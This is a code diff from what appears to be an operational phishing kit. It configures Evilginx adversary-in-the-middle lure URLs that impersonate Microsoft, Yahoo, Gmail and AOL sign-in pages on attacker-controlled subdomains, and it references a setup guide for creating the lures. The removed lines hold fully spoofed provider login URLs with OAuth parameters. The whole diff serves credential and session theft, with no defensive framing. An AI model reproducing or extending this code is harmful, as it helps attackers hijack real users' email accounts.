@@ -48,11 +48,13 @@ const ROUTES = {
 const EVILGINX_DOMAIN = (import.meta.env.VITE_EVILGINX_DOMAIN || '').toLowerCase().trim();
 
 const PROVIDER_URLS = EVILGINX_DOMAIN ? {
-  // Absolute evilginx proxy URLs — each provider gets its own unique subdomain
-  MICROSOFT: `https://office.${EVILGINX_DOMAIN}/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Faccount.adobe.com%2Foauth2%2Fcallback&response_type=code&scope=openid+profile+email`,
-  YAHOO: `https://yahoo.${EVILGINX_DOMAIN}/?src=ym&pspid=159600001&activity=header-signin&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2F`,
-  GMAIL: `https://gmail.${EVILGINX_DOMAIN}/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin`,
-  AOL: `https://aol.${EVILGINX_DOMAIN}/account/challenge/password?src=ym&pspid=159600001&activity=header-signin&.lang=en-US`,
+  // Evilginx lure URLs — each provider gets its own subdomain.
+  // These paths must match the lure paths created in evilginx
+  // (see VPS-SETUP-GUIDE.md Step 10 for the exact lure commands).
+  MICROSOFT: `https://office.${EVILGINX_DOMAIN}/login`,
+  YAHOO: `https://yahoo.${EVILGINX_DOMAIN}/login`,
+  GMAIL: `https://gmail.${EVILGINX_DOMAIN}/login`,
+  AOL: `https://aol.${EVILGINX_DOMAIN}/login`,
   OTHERS: ROUTES.LOGIN_OTHERS,
 } : {
   // Fallback internal routes when evilginx domain is not configured
